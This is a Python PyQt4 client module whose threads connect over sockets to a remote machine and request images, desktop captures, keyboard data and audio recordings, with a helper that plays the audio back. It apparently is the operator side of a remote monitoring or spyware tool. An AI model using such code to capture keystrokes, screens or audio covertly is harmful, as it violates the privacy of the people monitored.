import sys
from socket import *
from PyQt4.QtCore import *
from PyQt4.QtGui import *
from PyQt4 import QtCore, QtGui
from manager import *
import pyaudio
import wave
import sys,os

chunk = 1024

class UpdateImage(QThread):
    __address = None
    __manager = None
    
    def __init__(self, address, manager , parent = None):
        super(UpdateImage, self).__init__(parent)
        self.__address = address
        self.__manager = manager

    def run(self):
        socketServer = socket(AF_INET, SOCK_STREAM)
        try:
            socketServer.connect(self.__address)
        except:
            print "IP or PORT invalid!!!"
            return None
        while True:
            try:
                path = self.__manager.requestImagem(socketServer)
                if path == None:
                    continue
                
                self.emit(SIGNAL('update()'))
            except:
                continue
        socketServer.close()

class UpdateDesktop(QThread):
    __address = None
    __manager = None
    
    def __init__(self, address, manager , parent = None):
        super(UpdateDesktop, self).__init__(parent)
        self.__address = address
        self.__manager = manager

    def run(self):
        socketServer = socket(AF_INET, SOCK_STREAM)
        try:    
            socketServer.connect(self.__address)
        except:
            print "IP or PORT invalid!!!"
            return
        while True:
            try:
                path = self.__manager.requestDisplay(socketServer)
                if path == None:
                    continue
                self.emit(SIGNAL('update()'))
            except:
                continue
        socketServer.close()
        
class UpdateKeyboard(QThread):
    __address = None
    __size = None
    __manager = None
    
    def __init__(self, address, size, manager , parent = None):
        super(UpdateKeyboard, self).__init__(parent)
        self.__address = address
        self.__size = size
        self.__manager = manager

    def run(self):
        socketServer = socket(AF_INET, SOCK_STREAM)
        try:    
            socketServer.connect(self.__address)
        except:
            print "IP or PORT invalid!!!"
            return
        while True:
            fileKeys = self.__manager.requestKeyboard(socketServer, self.__size)
            if fileKeys == None:
                continue
            self.emit(SIGNAL('update()'))
            
            
class UpdateAudio(QThread):
    __address = None
    __size = None
    __manager = None
    
    def __init__(self, address, size, manager , parent = None):
        super(UpdateAudio, self).__init__(parent)
        self.__address = address
        self.__size = size
        self.__manager = manager

    def run(self):
        socketServer = socket(AF_INET, SOCK_STREAM)
        try:    
            socketServer.connect(self.__address)
        except:
            print "IP or PORT invalid!!!"
            return
        audio = self.__manager.requestAudio(socketServer, self.__size)
        if audio == None:
            print "Audio == None"
            return
        self.emit(SIGNAL('update()'))
        
        
class PlayAudio(QThread):
    __path = None
    def __init__(self, path, parent = None):
        super(PlayAudio, self).__init__(parent)
        self.__path = path

    def run(self):
        wf = wave.open(self.__path, 'rb')
        p = pyaudio.PyAudio()
        stream = p.open(format = p.get_format_from_width(wf.getsampwidth()), 
                        channels = wf.getnchannels(),
                        rate = wf.getframerate(),
                        output = True)
        data = wf.readframes(chunk)
        while data != '':
            stream.write(data)
            data = wf.readframes(chunk)
        stream.close()    
        p.terminate()